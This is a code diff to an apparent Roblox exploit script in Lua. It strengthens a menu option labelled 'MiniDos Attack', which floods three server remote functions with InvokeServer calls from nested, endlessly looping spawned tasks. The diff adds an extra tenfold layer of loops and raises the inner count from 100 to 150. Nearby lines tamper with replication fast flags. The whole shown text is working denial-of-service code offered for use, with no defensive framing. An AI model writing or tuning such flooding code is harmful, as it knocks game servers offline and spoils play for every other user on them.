@@ -107,20 +107,24 @@ game:DefineFastInt("NextGenerationReplicationBandwidthLimit", "1000000000")
 game:DefineFastFlag("EnableNextGenerationReplication", true)
 end)
 
-tab3:Option("MiniDos Attacks", function()
+tab3:Option("MiniDos Attack", function()
 local s = game:GetService("RobloxReplicatedStorage")
 local r1 = s:FindFirstChild("GetServerVersion")
 local r2 = s:FindFirstChild("GetServerType")
 local r3 = s:FindFirstChild("GetServerChannel")
 
+for i = 1, 10 do
+task.spawn(function()
 for i = 1, 35 do
 task.spawn(function()
-for i = 1, 100 do
+for i = 1, 150 do
 task.spawn(function()
 while task.wait() do
 r1:InvokeServer()
 r2:InvokeServer()
 r3:InvokeServer()
+end
+end)
 end
 end)
 end
